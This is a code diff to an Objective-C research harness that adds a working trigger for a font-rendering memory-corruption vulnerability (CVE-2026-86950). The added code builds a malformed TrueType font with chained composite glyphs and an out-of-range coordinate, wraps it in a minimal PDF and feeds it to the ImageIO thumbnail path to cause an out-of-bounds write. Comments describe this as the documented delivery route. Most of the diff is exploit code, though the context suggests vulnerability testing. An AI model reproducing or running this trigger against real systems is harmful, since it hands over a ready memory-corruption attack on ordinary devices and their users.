@@ -30,12 +30,13 @@
 #import <CoreGraphics/CoreGraphics.h>
 #import <CoreText/CoreText.h>
 #import <ImageIO/ImageIO.h>
+#import <zlib.h>
 #import <dlfcn.h>
 #import <fcntl.h>
 #import <string.h>
 #import <unistd.h>
 
-#define P072_BUILD @"p072-glyph-oob-oracle-v2"
+#define P072_BUILD @"p072-86950-pdf-vehicle-v3"
 
 static void p072_dl(void (^L)(NSString *), const char *path) {
     void *h = dlopen(path, RTLD_LAZY);
@@ -190,6 +191,201 @@ static void p072_pathfill(double extreme) {
     CGContextClosePath(ctx);
     CGContextFillPath(ctx);
     CGContextRelease(ctx);
+}
+
+/* ================= 86950 PDF VEHICLE (v3) =================
+   Our reimplementation of the CVE-2026-86950 trigger class
+   (parameters per Calif's "The Great Glyph Grift" - no third-party
+   bytes). Local validation on macOS 15.7.8: 672B sfnt loads (glyphs=11),
+   'A'->gid10 maps, composite chain renders (gid10@17 = 23836 px vs
+   leaf@17 = 68 px -> the 512x chain scaling is live), PDF parses clean.
+   Device route = the documented delivery path: PDF -> ImageIO
+   CGImageSourceCreateThumbnailAtIndex -> PDFReadPlugin -> op_Tj ->
+   glyph chain -> aa_cache_render. */
+
+#define P072V3_UPM    16384
+#define P072V3_DX     33      /* >=32 -> malloc/heap OOB; <=31 -> alloca/stack */
+#define P072V3_NCOMP  9       /* composite glyphs: c0..c7 + A */
+#define P072V3_NUMG   (2 + P072V3_NCOMP)   /* 11 */
+
+static void p072v3_be32(uint8_t *p, uint32_t v){ p[0]=(uint8_t)(v>>24); p[1]=(uint8_t)(v>>16); p[2]=(uint8_t)(v>>8); p[3]=(uint8_t)v; }
+static void p072v3_be16(uint8_t *p, uint16_t v){ p[0]=(uint8_t)(v>>8); p[1]=(uint8_t)v; }
+static uint32_t p072v3_tsum(const uint8_t *b, uint32_t len){
+    uint32_t s=0, n=(len+3)&~3u;
+    for (uint32_t i=0;i<n;i+=4){ uint32_t w=0;
+        for (int j=0;j<4;j++) w=(w<<8)|((i+(uint32_t)j<len)?b[i+j]:0);
+        s+=w; }
+    return s;
+}
+
+/* leaf: contour0 rect (0,0)..(DX,40) sets bbox/coverage width; contour1
+   = 2-pt line at x=32000 (the sat/trunc mismatch contour). 46 bytes. */
+static void p072v3_build_leaf(uint8_t *g){
+    int i=0;
+    p072v3_be16(g+i,2); i+=2;
+    p072v3_be16(g+i,0); i+=2;
+    p072v3_be16(g+i,0); i+=2;
+    p072v3_be16(g+i,P072V3_DX); i+=2;
+    p072v3_be16(g+i,40); i+=2;
+    p072v3_be16(g+i,3); i+=2;       /* endPts[0]=3 */
+    p072v3_be16(g+i,5); i+=2;       /* endPts[1]=5 */
+    p072v3_be16(g+i,0); i+=2;       /* instructionLength */
+    for (int f=0;f<6;f++) g[i++]=0x01;
+    p072v3_be16(g+i,0); i+=2;      p072v3_be16(g+i,0); i+=2;
+    p072v3_be16(g+i,P072V3_DX); i+=2; p072v3_be16(g+i,0); i+=2;
+    p072v3_be16(g+i,0); i+=2;      p072v3_be16(g+i,40); i+=2;
+    p072v3_be16(g+i,(uint16_t)-P072V3_DX); i+=2; p072v3_be16(g+i,0); i+=2;
+    p072v3_be16(g+i,32000); i+=2;  p072v3_be16(g+i,(uint16_t)-39); i+=2;
+    p072v3_be16(g+i,0); i+=2;      p072v3_be16(g+i,38); i+=2;
+}
+
+/* composite glyph (18B): 0xFFFF signature + forced bbox, then component
+   flags 0x000E (ARGS_ARE_XY_VALUES|ROUND_XY_TO_GRID|WE_HAVE_A_SCALE),
+   glyphIndex, s8 dx dy, F2Dot14 0x7FFF (~2.0 per level). */
+static void p072v3_build_composite(uint8_t *c, uint16_t gid){
+    p072v3_be16(c+0,0xFFFF);
+    p072v3_be16(c+2,0); p072v3_be16(c+4,0);
+    p072v3_be16(c+6,P072V3_DX); p072v3_be16(c+8,40);
+    p072v3_be16(c+10,0x000E);
+    p072v3_be16(c+12,gid);
+    c[14]=0; c[15]=0;
+    p072v3_be16(c+16,0x7FFF);
+}
+
+/* gid1=leaf; gid2..gid10=composites; glyph g references g-1 (9 levels):
+   leaf x = 32000 * (32767/16384)^9 ~= 16.4M font units. */
+static NSData *p072v3_build_ttf(void){
+    const uint32_t leafLen=46, compLen=18;
+    uint32_t glyfLen = leafLen + (uint32_t)P072V3_NCOMP*compLen;
+    uint8_t *glyf = malloc(glyfLen);
+    p072v3_build_leaf(glyf);
+    for (int k=0;k<P072V3_NCOMP;k++) {
+        uint8_t comp[18];
+        p072v3_build_composite(comp, (uint16_t)(1+k));
+        memcpy(glyf+leafLen+(uint32_t)k*compLen, comp, 18);
+    }
+    uint8_t head[54], hhea[36], maxp[32], name[40], post[32], cmap[48];
+    uint8_t *hmtx = malloc((uint32_t)P072V3_NUMG*4);
+    uint8_t *loca = malloc((uint32_t)(P072V3_NUMG+1)*2);
+    memset(head,0,54);
+    p072v3_be32(head+0,0x00010000); p072v3_be32(head+4,0x00010000);
+    p072v3_be32(head+12,0x5F0F3CF5);
+    p072v3_be16(head+18,P072V3_UPM);
+    p072v3_be16(head+36,0); p072v3_be16(head+38,0);
+    p072v3_be16(head+40,P072V3_DX); p072v3_be16(head+42,40);
+    p072v3_be16(head+46,8); p072v3_be16(head+48,2); p072v3_be16(head+50,0); p072v3_be16(head+52,0);
+    memset(hhea,0,36);
+    p072v3_be32(hhea+0,0x00010000);
+    p072v3_be16(hhea+4,100); p072v3_be16(hhea+6,(uint16_t)-100);
+    p072v3_be16(hhea+10,100); p072v3_be16(hhea+16,P072V3_DX); p072v3_be16(hhea+18,1);
+    p072v3_be16(hhea+34,(uint16_t)P072V3_NUMG);
+    memset(maxp,0,32);
+    p072v3_be32(maxp+0,0x00010000);
+    p072v3_be16(maxp+4,(uint16_t)P072V3_NUMG);
+    p072v3_be16(maxp+14,2);
+    p072v3_be16(maxp+30,(uint16_t)P072V3_NCOMP);
+    for (int i=0;i<P072V3_NUMG;i++){ p072v3_be16(hmtx+4*i,100); p072v3_be16(hmtx+4*i+2,0); }
+    /* cmap format4: 'A'(0x41) -> gid 10 */
+    memset(cmap,0,48);
+    p072v3_be16(cmap+0,0); p072v3_be16(cmap+2,1);
+    p072v3_be16(cmap+4,3); p072v3_be16(cmap+6,1); p072v3_be32(cmap+8,12);
+    p072v3_be16(cmap+12,4); p072v3_be16(cmap+14,32); p072v3_be16(cmap+16,0);
+    p072v3_be16(cmap+18,4); p072v3_be16(cmap+20,4); p072v3_be16(cmap+22,1); p072v3_be16(cmap+24,0);
+    p072v3_be16(cmap+26,0x41);   p072v3_be16(cmap+28,0xFFFF);
+    p072v3_be16(cmap+32,0x41);   p072v3_be16(cmap+34,0xFFFF);
+    p072v3_be16(cmap+36,(uint16_t)((P072V3_NUMG-1)-0x41)); p072v3_be16(cmap+38,1);
+    uint32_t offs[P072V3_NUMG+1], cur=0;
+    for (int g=0;g<P072V3_NUMG;g++){
+        offs[g]=cur;
+        cur += (g==1) ? leafLen : ((g>=2) ? compLen : 0);
+        cur = (cur+1)&~1u;
+    }
+    offs[P072V3_NUMG]=cur;
+    for (int i=0;i<=P072V3_NUMG;i++) p072v3_be16(loca+2*i,(uint16_t)(offs[i]/2));
+    memset(name,0,40);
+    p072v3_be16(name+0,0); p072v3_be16(name+2,2); p072v3_be16(name+4,32);
+    p072v3_be16(name+6,3);  p072v3_be16(name+8,1);  p072v3_be16(name+10,0x409);
+    p072v3_be16(name+12,1); p072v3_be16(name+14,5); p072v3_be16(name+16,0);
+    p072v3_be16(name+18,3); p072v3_be16(name+20,1); p072v3_be16(name+22,0x409);
+    p072v3_be16(name+24,2); p072v3_be16(name+26,1); p072v3_be16(name+28,5);
+    memcpy(name+32,"L072T",5); name[37]='R';
+    memset(post,0,32); p072v3_be32(post+0,0x00030000); p072v3_be16(post+10,50);
+    struct { const char *tag; uint8_t *d; uint32_t len; } T[] = {
+        {"cmap",cmap,44},{"glyf",glyf,glyfLen},{"head",head,54},{"hhea",hhea,36},
+        {"hmtx",hmtx,(uint32_t)P072V3_NUMG*4},{"loca",loca,(uint32_t)(P072V3_NUMG+1)*2},
+        {"maxp",maxp,32},{"name",name,40},{"post",post,32},
+    };
+    const int nt=9;
+    uint32_t cur0=12+(uint32_t)nt*16, offs2[9];
+    for (int i=0;i<nt;i++){ offs2[i]=(cur0+3)&~3u; cur0=offs2[i]+T[i].len; }
+    NSMutableData *d=[NSMutableData dataWithLength:cur0];
+    uint8_t *b=(uint8_t *)d.mutableBytes;
+    p072v3_be32(b+0,0x00010000);
+    p072v3_be16(b+4,nt); p072v3_be16(b+6,128); p072v3_be16(b+8,3); p072v3_be16(b+10,16);
+    for (int i=0;i<nt;i++){
+        uint8_t *e=b+12+(uint32_t)i*16;
+        memcpy(e,T[i].tag,4);
+        p072v3_be32(e+4,p072v3_tsum(T[i].d,T[i].len));
+        p072v3_be32(e+8,offs2[i]); p072v3_be32(e+12,T[i].len);
+        memcpy(b+offs2[i],T[i].d,T[i].len);
+    }
+    free(glyf); free(hmtx); free(loca);
+    return d;
+}
+
+/* Minimal PDF: BT /F1 1024 Tf 5 5 Td (A) Tj ET, /FontFile2 = flate(ttf). */
+static NSData *p072v3_build_pdf(NSData *ttf){
+    const char *raw=(const char *)ttf.bytes;
+    NSUInteger rawLen=ttf.length;
+    uint8_t *zbuf=malloc(rawLen+1024);
+    uLongf zlen=(uLongf)(rawLen+1024);
+    if (compress(zbuf,&zlen,(const Bytef *)raw,(uLong)rawLen)!=Z_OK){ free(zbuf); return nil; }
+    uint8_t stream[]="BT /F1 1024 Tf 5 5 Td (A) Tj ET\n";
+    uint32_t slen=(uint32_t)(sizeof(stream)-1);
+    NSMutableData *d=[NSMutableData data];
+    NSString *o0=@"<< /Type /Catalog /Pages 2 0 R >>";
+    NSString *o1=@"<< /Type /Pages /Kids [3 0 R] /Count 1 >>";
+    NSString *o2=@"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+                  "/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>";
+    const char *s3fmt="<< /Length %u >>\nstream\n%s endstream";
+    char ob3[128];
+    snprintf(ob3,sizeof ob3,s3fmt,(unsigned)slen,(char*)stream);
+    NSString *o3=[NSString stringWithUTF8String:ob3];
+    NSString *o4=@"<< /Type /Font /Subtype /TrueType /BaseFont /L072Trigger "
+                  "/FirstChar 65 /LastChar 65 /Widths [100] "
+                  "/Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>";
+    NSString *o5=@"<< /Type /FontDescriptor /FontName /L072Trigger /Flags 4 "
+                  "/FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 "
+                  "/CapHeight 100 /StemV 80 /FontFile2 7 0 R >>";
+    NSString *o6=[NSString stringWithFormat:@"<< /Length %lu /Length1 %lu /Filter /FlateDecode >>\nstream\n",
+                  (unsigned long)zlen,(unsigned long)rawLen];
+    NSString *hdrs[7]={o0,o1,o2,o3,o4,o5,o6};
+    [d appendBytes:"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n" length:15];
+    uint32_t offs[7];
+    for (int i=0;i<7;i++){
+        offs[i]=(uint32_t)d.length;
+        char h[32]; int hl=snprintf(h,sizeof h,"%d 0 obj\n",i+1);
+        [d appendBytes:h length:(NSUInteger)hl];
+        [d appendBytes:hdrs[i].UTF8String length:hdrs[i].length];
+        if (i==6){
+            [d appendBytes:zbuf length:(NSUInteger)zlen];
+            [d appendBytes:"\nendstream\nendobj\n" length:17];
+        } else {
+            [d appendBytes:"\nendobj\n" length:8];
+        }
+    }
+    uint32_t tablePos=(uint32_t)d.length;
+    char x[64]; int xl=snprintf(x,sizeof x,"xref\n0 8\n0000000000 65535 f \n");
+    [d appendBytes:x length:(NSUInteger)xl];
+    for (int i=0;i<7;i++){
+        char e[32]; int el=snprintf(e,sizeof e,"%010u 00000 n \n",offs[i]);
+        [d appendBytes:e length:(NSUInteger)el];
+    }
+    char t[128]; int tl=snprintf(t,sizeof t,
+        "trailer\n<< /Size 8 /Root 1 0 R >>\nstartxref\n%u\n%%%%EOF\n", tablePos);
+    [d appendBytes:t length:(NSUInteger)tl];
+    free(zbuf);
+    return d;
 }
 
 @implementation P072FileParserMap
@@ -396,8 +592,54 @@ static void p072_pathfill(double extreme) {
     Lv(@"[sweep] path done 5 fills");
     if (craftFont) CFRelease(craftFont);
 
-    L(@"[oracle] if no crash: no trigger with the naive+band sweep on this");
-    L(@"build — log the run and hold for the p072 v3 PDF-ingest vehicle.");
+    /* ===== v3: PDF-ingest vehicle (the documented delivery path) ===== */
+    Lv(@"=== v3 86950 PDF VEHICLE (ImageIO thumbnail route) ===");
+    NSData *ttf3 = p072v3_build_ttf();
+    Lv([NSString stringWithFormat:@"v3 font built %lu bytes",
+        (unsigned long)ttf3.length]);
+    NSData *pdf3 = p072v3_build_pdf(ttf3);
+    if (pdf3) {
+        Lv([NSString stringWithFormat:@"v3 pdf built %lu bytes",
+            (unsigned long)pdf3.length]);
+        NSString *pdfPath3 = [docs stringByAppendingPathComponent:@"p072_trigger.pdf"];
+        NSString *ttfPath3 = [docs stringByAppendingPathComponent:@"p072_trigger.ttf"];
+        BOOL w1 = [ttf3 writeToFile:ttfPath3 atomically:NO];
+        if (fd >= 0) fsync(fd);
+        BOOL w2 = [pdf3 writeToFile:pdfPath3 atomically:NO];
+        Lv([NSString stringWithFormat:@"v3 files written ttf=%@ pdf=%@",
+            w1 ? @"OK" : @"FAIL", w2 ? @"OK" : @"FAIL"]);
+        if (w2) {
+            Lv(@"v3 [thumb] CGImageSourceCreateThumbnailAtIndex NOW (256px)");
+            CFURLRef url3 = CFURLCreateWithFileSystemPath(NULL, (__bridge CFStringRef)pdfPath3, kCFURLPOSIXPathStyle, false);
+            CGImageSourceRef src3 = url3 ? CGImageSourceCreateWithURL(url3, NULL) : NULL;
+            if (url3) CFRelease(url3);
+            if (src3) {
+                int sz3 = 256;
+                CFStringRef k3[] = { kCGImageSourceCreateThumbnailFromImageAlways,
+                                     kCGImageSourceThumbnailMaxPixelSize };
+                CFTypeRef v3[] = { kCFBooleanTrue,
+                                   CFNumberCreate(NULL, kCFNumberIntType, &sz3) };
+                CFDictionaryRef opts3 = CFDictionaryCreate(NULL, (const void**)k3, (const void**)v3, 2,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CGImageRef img3 = CGImageSourceCreateThumbnailAtIndex(src3, 0, opts3);
+                Lv([NSString stringWithFormat:@"v3 [thumb] SURVIVED img=%p (pre-fix build should have crashed)",
+                    (void*)img3]);
+                if (img3) CGImageRelease(img3);
+                CFRelease(opts3);
+                CFRelease(v3[1]);
+            } else {
+                Lv(@"v3 [thumb] source FAIL");
+            }
+            if (src3) CFRelease(src3);
+        }
+    } else {
+        Lv(@"v3 pdf build FAIL (flate)");
+    }
+    Lv(@"v3 crash decode: ips with aa_cache_render + EXC_BAD_ACCESS / 16-bit");
+    Lv(@"stores = CVE-2026-86950 confirmed live; craft persisted to Documents/");
+
+    L(@"[oracle] if no crash: naive+band sweep AND the v3 PDF vehicle both");
+    L(@"missed on this build — craft persisted for the ips-side decode.");
 
     L(@"=== VERDICT ===");
     L(@"Slot 1: in-app parse is occupancy of THIS task. 86950 oracle aimed.");
